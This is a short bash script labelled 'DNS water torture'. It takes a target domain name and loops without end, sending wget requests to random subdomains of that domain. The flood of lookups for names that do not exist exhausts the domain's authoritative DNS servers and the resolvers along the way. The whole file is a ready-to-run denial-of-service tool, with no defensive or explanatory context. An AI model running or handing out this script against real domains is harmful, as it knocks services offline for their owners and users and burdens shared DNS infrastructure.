#!/bin/bash
# DNS WATER TORTURE with WGET

if [ -z "$1" ]
   then
      echo "Domain Name Required. please define one before continuing \r\n"
      exit
else
      DomainName=$1
      echo "Domain Name is set to $DomainName \r\n"
fi

while true; do
        wget -O /dev/null $RANDOM.$DomainName
done

